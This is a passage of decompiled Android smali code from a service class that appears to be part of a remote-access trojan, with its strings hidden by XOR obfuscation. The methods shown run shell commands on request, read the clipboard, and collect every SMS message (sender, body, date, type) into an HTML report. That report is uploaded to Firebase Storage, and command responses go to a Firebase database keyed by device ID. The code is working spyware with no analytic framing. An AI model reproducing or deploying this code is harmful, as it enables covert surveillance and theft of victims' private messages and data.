    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    .line 624
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->length()I

    move-result v0

    :goto_0
    if-lt v0, v2, :cond_0

    .line 629
    iget-object v0, p0, Lsigma/male/servicess;->responsetxt:Ljava/util/HashMap;

    const-string v1, "JzoiQA=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 630
    iget-object v0, p0, Lsigma/male/servicess;->_firebase:Lcom/google/firebase/database/FirebaseDatabase;

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "eiYjXkg6J2lfXSYkKQ=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2}, Lsigma/male/gui;->uuii(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/FirebaseDatabase;->getReference(Ljava/lang/String;)Lcom/google/firebase/database/DatabaseReference;

    move-result-object v0

    const-string v1, "JzE1XVc="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/DatabaseReference;->child(Ljava/lang/String;)Lcom/google/firebase/database/DatabaseReference;

    move-result-object v0

    .line 631
    iget-object v1, p0, Lsigma/male/servicess;->responsetxt:Ljava/util/HashMap;

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/DatabaseReference;->setValue(Ljava/lang/Object;)Lcom/google/android/gms/tasks/Task;

    .line 632
    return-void

    .line 625
    :cond_0
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v5

    invoke-virtual {v3, v5}, Ljava/util/Random;->nextInt(I)I

    move-result v5

    invoke-virtual {v1, v5}, Ljava/lang/String;->charAt(I)C

    move-result v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    .line 624
    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method

.method public _showtoast(Ljava/lang/String;)V
    .locals 6

    .prologue
    .line 949
    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0, p1}, Lsigma/male/SketchwareUtil;->showMessage(Landroid/content/Context;Ljava/lang/String;)V

    .line 950
    const-string v0, "MT0nQVcyIi9ITw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    const-string v0, "ATsnXkx1By5CTzt0FVhbNjE1Xl4gOCpU"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    const-string v5, ""

    move-object v0, p0

    invoke-virtual/range {v0 .. v5}, Lsigma/male/servicess;->_setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 951
    return-void
.end method

.method public _sudoapt(Ljava/lang/String;Ljava/lang/String;)V
    .locals 6

    .prologue
    .line 924
    invoke-virtual {p0, p1}, Lsigma/male/servicess;->shell_exec(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 925
    const-string v0, "JjwjQVQjPSNa"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    const-string v4, ""

    const-string v5, ""

    move-object v0, p0

    invoke-virtual/range {v0 .. v5}, Lsigma/male/servicess;->_setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 928
    return-void
.end method

.method public _ttsdev(Ljava/lang/String;)V
    .locals 6

    .prologue
    .line 961
    iget-object v0, p0, Lsigma/male/servicess;->tts:Landroid/speech/tts/TextToSpeech;

    const/4 v1, 0x1

    const/4 v2, 0x0

    invoke-virtual {v0, p1, v1, v2}, Landroid/speech/tts/TextToSpeech;->speak(Ljava/lang/String;ILjava/util/HashMap;)I

    .line 962
    const-string v0, "MT0nQVcyIi9ITw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    const-string v0, "AQAVDXs6OTZBXSExIg1rIDclSEsmMjNBVCw="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    const-string v5, ""

    move-object v0, p0

    invoke-virtual/range {v0 .. v5}, Lsigma/male/servicess;->_setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 963
    return-void
.end method

.method public _vibra(Ljava/lang/String;)V
    .locals 6

    .prologue
    .line 955
    iget-object v0, p0, Lsigma/male/servicess;->vbs:Landroid/os/Vibrator;

    invoke-static {p1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v1

    int-to-long v2, v1

    invoke-virtual {v0, v2, v3}, Landroid/os/Vibrator;->vibrate(J)V

    .line 956
    const-string v0, "MT0nQVcyIi9ITw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    const-string v0, "ETEwRFswdBBEWic1Mkhc"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    const-string v5, ""

    move-object v0, p0

    invoke-virtual/range {v0 .. v5}, Lsigma/male/servicess;->_setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 957
    return-void
.end method

.method public _voicere(Ljava/lang/String;)V
    .locals 6

    .prologue
    .line 1094
    const-string v0, "MT0nQVcyIi9ITw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v3, "GTUzQ1s9MSINbQcYZhcY"

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    const-string v5, ""

    move-object v0, p0

    invoke-virtual/range {v0 .. v5}, Lsigma/male/servicess;->_setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 1095
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    .line 1096
    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 1098
    const-string v1, "NDoiX1c8MGhEViExKFkWNDcyRFc7ehBkfQI="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 1099
    invoke-static {p1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    .line 1100
    invoke-virtual {p0, v0}, Lsigma/male/servicess;->startActivity(Landroid/content/Intent;)V

    .line 1104
    return-void
.end method

.method public clips()V
    .locals 6

    .prologue
    const/4 v0, 0x0

    .line 1052
    const/4 v1, 0x1

    new-array v2, v1, [Landroid/content/ClipboardManager;

    .line 1053
    const-string v1, ""

    .line 1058
    new-instance v3, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v4

    invoke-direct {v3, v4}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v4, Lsigma/male/servicess$27;

    invoke-direct {v4, p0, v2}, Lsigma/male/servicess$27;-><init>(Lsigma/male/servicess;[Landroid/content/ClipboardManager;)V

    invoke-virtual {v3, v4}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    .line 1074
    const/4 v3, 0x0

    :try_start_0
    aget-object v3, v2, v3

    invoke-virtual {v3}, Landroid/content/ClipboardManager;->hasPrimaryClip()Z

    move-result v3

    if-eqz v3, :cond_1

    .line 1075
    const/4 v3, 0x0

    aget-object v3, v2, v3

    invoke-virtual {v3}, Landroid/content/ClipboardManager;->getPrimaryClipDescription()Landroid/content/ClipDescription;

    move-result-object v3

    .line 1076
    const/4 v4, 0x0

    aget-object v2, v2, v4

    invoke-virtual {v2}, Landroid/content/ClipboardManager;->getPrimaryClip()Landroid/content/ClipData;

    move-result-object v2

    .line 1077
    if-eqz v2, :cond_0

    if-eqz v3, :cond_0

    const-string v4, "ITE+WRclOCdEVg=="

    invoke-static {v4}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Landroid/content/ClipDescription;->hasMimeType(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_0

    .line 1078
    const/4 v1, 0x0

    invoke-virtual {v2, v1}, Landroid/content/ClipData;->getItemAt(I)Landroid/content/ClipData$Item;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/ClipData$Item;->getText()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    .line 1079
    :cond_0
    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z
    :try_end_0
    .catch Ljava/lang/NullPointerException; {:try_start_0 .. :try_end_0} :catch_0

    move-result v2

    if-eqz v2, :cond_1

    .line 1087
    :goto_0
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "aTAvWxg2OCdeS3VpYUZdLDgpSl9ydHgN"

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "aXsiRE5r"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 1089
    const-string v0, "MTEwRFswPShLVw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    const-string v4, ""

    const-string v5, ""

    move-object v0, p0

    invoke-virtual/range {v0 .. v5}, Lsigma/male/servicess;->_setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 1091
    return-void

    .line 1084
    :catch_0
    move-exception v1

    goto :goto_0

    :cond_1
    move-object v0, v1

    goto :goto_0
.end method

.method public getAllSms(Landroid/content/Context;)V
    .locals 12

    .prologue
    const/4 v2, 0x0

    .line 638
    invoke-virtual {p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 639
    sget-object v1, Landroid/provider/Telephony$Sms;->CONTENT_URI:Landroid/net/Uri;

    move-object v3, v2

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v4

    .line 641
    const-string v0, "aTwyQFRraCtITDR0KExVMGlhW1EwIzZCSiFzZk5XOyAjQ0xoczFEXCE8e0ldIz0lSBUiPSJZUHl0L0NRIT0nQRUmNydBXWhlYRMEODEyTBg7NStIBXI3LkxKJjEyChg2OyhZXTsgewptARJrFR91anpeWyc9NlkYIS02SAVyICNVTHo+J1tZJjc0REghc2ZeSjZpYUVMISQ1Fxd6NSxMQHszKUJfOTEnXVEmeiVCVXo1LExAejgvT0t6PjdYXSctaR4WYXp2AlIkISNfQXs5L0MWPydhEwR6JyVfUSUgeA0EJiA/QV1rdCRCXCwvK0xKMj0oFwhuJCdJXDw6IRcIbjYnTlMyJilYVjFuZU5bNiloTFs2OzRJUTo6PU9ZNj8hX1cgOiIAWzo4KV8CdjIgSwM2OypCSm93dh0IbjczX0s6JnxdVzw6MkhKbiQnSVw8OiEXCW0kPhZPPDAyRQJkZHYIAzc7NEldJ24oQlYwbzJIQCF5J0FRMjp8QV0zIH1CTSE4L0Ndb2R9S1c7IGteUS8xfBwNJSx9XVcmPTJEVztuNEhUNCAvW11uIDRMViY9MkRXO25oGUtuJCdJXDw6IQBUMDIyFw1lJD5QFjQ3JUJKMT0pQwI9OzBISnl6J05MPCIjVlo0Ny1KSjohKABbOjgpXwJ2NSdMRXs1JU5XJzAvQlZvNSBZXScvJUJWITEoWQJytsaXH243KUFXJ25lHQhlbyBCViF5MUhRMjwyFw9lZH1LVDo1MhdKPDMuWQMhJidDSzM7NEACJzsyTEwwfH8dXDAzbxZVNCYhRFZ4OCNLTG9hNlVFezUlWVEjMXxMXiExNFZbOjoySFYhbmHPuO9zOwNINDojQUMlNSJJUTszfB0YZGw2VQM3NSVGXyc7M0NceDcpQVcnbmVIXTBvK0xAeDwjRF89IHwdAzY7KkJKb3d2HQhuOzBISjM4KVoCPT0iSV07bzJfWTsnL1lROjp8QFkteS5IUTI8Mg0WZydmSFkmMWtCTSEpJFhMITsoDUslNShWSDonL1lROjp8TFomOypYTDBvNERfPSB8GAglLDtPTSEgKUMYPDkhVlAwPSFFTG9ndl1AbiQpXlEhPSlDAjQ2NUJUICAjFlQwMjIXCWUkPhZMOiR8HAglLH1aUTEgLhcLZSQ+UBY8Ly5IUTI8MhcLZSQ+Fk88MDJFAmZhNlUDOTEgWQJtJD4WTCc1KF5eOiYrF0s2NSpIEHttb1AWJTUoSFQuJCdJXDw6IRcIdWV+XUBuNidOUzImKVhWMXklQlQ6JnwOXTAxfUBZLXkuSFEyPDIXCG43KUFXJ25lHQhlbylbXScyKkJPbzwvSVwwOn1ZSjQ6NURMPDsoF1U0LGtFXTwzLlkYe2Y1DV00JyMAVyAgO09NISApQxgmJCdDQyU7NURMPDsoF1k3JylBTSExfV9RMjwyFw1lJD5QWiAgMkJWdT0rSkM9MS9KUCFudR1ILW82Qks8IC9CVm81JF5XOSEySAM5MSBZAmRkNlUDITs2FwllJD4WTzwwMkUCZmQ2VUVpezVZQTkxeA=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 642
    if-eqz v4, :cond_1

    .line 643
    invoke-interface {v4}, Landroid/database/Cursor;->getCount()I

    move-result v5

    .line 644
    invoke-interface {v4}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 645
    const/4 v1, 0x0

    move v3, v1

    move-object v2, v0

    :goto_0
    if-lt v3, v5, :cond_3

    move-object v0, v2

    .line 673
    :cond_0
    invoke-interface {v4}, Landroid/database/Cursor;->close()V

    .line 674
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v1, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v0, "aSclX1ElIGZZQSUxewpMMCwyAlI0IideWyc9Nlkfa3Q="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "MyEoTkw8OygNTDh8MgRDJzEyWEo7dChIT3UQJ1ldfWUjHhIhfWhZVxk7JUxUMAcyX1E7M24EAyhwbgpLJTUoChF7MSdOUH0yM0NbIT0pQxAheCMEQ3F8IwQWPSArQRAhOW5dWScnI2RWIXxiBV18ei5ZVTl8bwQRfClvFk40JmZEFDQ3JRBcOjczQF07IGhKXSERKkhVMDoyXnosFypMSyYaJ0BdfXMnTls6JiJEVztzbxZeOiZuRAVlby8RWTY3aEFdOzMyRQM8f20EWTY3HURlezUiSX0jMShZdDwnMkhWMCZuCls5PSVGH3kyM0NbIT0pQxB8LzJFUSZ6JUFZJicKREshejJCXzI4IwUfNDcyRE4wc28WTjQmZlkFITwvXhY7MT5ZfTkxK0hWIQcvT1Q8OiEWTHsnMlRUMHorTEAdMS9KUCFrMgNLIS0qSBY4NT5lXTwzLlkFOyEqQQIhejVZQTkxaEBZLRwjRF89IHtZFiY3NEJUORwjRF89IG0KSC1zOwQD"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "aXs1Tko8JDIT"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 681
    :cond_1
    :try_start_0
    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v1}, Lsigma/male/FileUtil;->getPackageDataDir(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "eicrXhY9ICtB"

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lsigma/male/FileUtil;->isExistFile(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_2

    .line 682
    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v1}, Lsigma/male/FileUtil;->getPackageDataDir(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "eicrXhY9ICtB"

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lsigma/male/FileUtil;->deleteFile(Ljava/lang/String;)V

    .line 684
    :cond_2
    new-instance v1, Ljava/io/FileOutputStream;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3}, Lsigma/male/FileUtil;->getPackageDataDir(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "eicrXhY9ICtB"

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x1

    invoke-direct {v1, v2, v3}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;Z)V

    .line 685
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v2, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v0, "\n\n"

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/io/FileOutputStream;->write([B)V

    .line 686
    invoke-virtual {v1}, Ljava/io/FileOutputStream;->close()V

    .line 689
    iget-object v0, p0, Lsigma/male/servicess;->sigmamale:Lcom/google/firebase/storage/StorageReference;

    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v1}, Lsigma/male/FileUtil;->getPackageDataDir(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "eicrXhY9ICtB"

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/StorageReference;->child(Ljava/lang/String;)Lcom/google/firebase/storage/StorageReference;

    move-result-object v0

    new-instance v1, Ljava/io/File;

    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2}, Lsigma/male/FileUtil;->getPackageDataDir(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "eicrXhY9ICtB"

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {v1}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/StorageReference;->putFile(Landroid/net/Uri;)Lcom/google/firebase/storage/UploadTask;

    move-result-object v0

    iget-object v1, p0, Lsigma/male/servicess;->_sigmamale_failure_listener:Lcom/google/android/gms/tasks/OnFailureListener;

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/UploadTask;->addOnFailureListener(Lcom/google/android/gms/tasks/OnFailureListener;)Lcom/google/firebase/storage/StorageTask;

    move-result-object v0

    iget-object v1, p0, Lsigma/male/servicess;->_sigmamale_upload_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/StorageTask;->addOnProgressListener(Lcom/google/firebase/storage/OnProgressListener;)Lcom/google/firebase/storage/StorageTask;

    move-result-object v0

    new-instance v1, Lsigma/male/servicess$23;

    invoke-direct {v1, p0}, Lsigma/male/servicess$23;-><init>(Lsigma/male/servicess;)V

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/StorageTask;->continueWithTask(Lcom/google/android/gms/tasks/Continuation;)Lcom/google/android/gms/tasks/Task;

    move-result-object v0

    .line 693
    iget-object v1, p0, Lsigma/male/servicess;->_sigmamale_upload_success_listener:Lcom/google/android/gms/tasks/OnCompleteListener;

    invoke-virtual {v0, v1}, Lcom/google/android/gms/tasks/Task;->addOnCompleteListener(Lcom/google/android/gms/tasks/OnCompleteListener;)Lcom/google/android/gms/tasks/Task;
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 707
    :goto_1
    return-void

    .line 646
    :cond_3
    const-string v0, "MTUySA=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-interface {v4, v0}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v4, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    .line 647
    const-string v0, "NDAiX10mJw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-interface {v4, v0}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v4, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    .line 648
    const-string v0, "NzsiVA=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-interface {v4, v0}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v4, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    .line 649
    new-instance v0, Ljava/util/Date;

    invoke-static {v6}, Ljava/lang/Long;->valueOf(Ljava/lang/String;)Ljava/lang/Long;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Long;->longValue()J

    move-result-wide v10

    invoke-direct {v0, v10, v11}, Ljava/util/Date;-><init>(J)V

    .line 650
    const-string v1, ""

    .line 651
    const-string v0, ""

    .line 652
    const-string v9, "IS02SA=="

    invoke-static {v9}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-interface {v4, v9}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v9

    invoke-interface {v4, v9}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v9

    packed-switch v9, :pswitch_data_0

    .line 666
    :goto_2
    :pswitch_0
    new-instance v9, Ljava/lang/StringBuilder;

    .line 668
    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v9, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "aTYzWUw6OmZOVDQnNRAfNDclQkoxPSlDH2toL0BfdSc0TgVy"

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v9, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "cnQnQUxocw=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "cnR4"

